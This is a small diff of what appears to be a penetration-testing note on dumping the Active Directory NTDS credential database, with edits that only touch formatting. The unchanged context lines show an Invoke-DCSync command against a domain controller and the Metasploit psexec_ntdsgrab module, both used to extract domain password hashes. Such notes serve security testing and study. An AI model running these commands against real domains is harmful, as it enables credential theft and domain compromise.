@@ -1,14 +1,6 @@
----
-date: 
-tags:
-  - ActiveDirectory
-  - NTDS
----
 
-```table-of-contents
-```
 
-# Description: 
+# Description:
 
 https://attack.mitre.org/techniques/T1003/003/
 
@@ -56,7 +48,7 @@ Invoke-DCSync -dcfqdn DC01.security.local -username administrator
 
 ### Metasploit
 
-```
+```bash
 use auxiliary/admin/smb/psexec_ntdsgrab
 ```
 
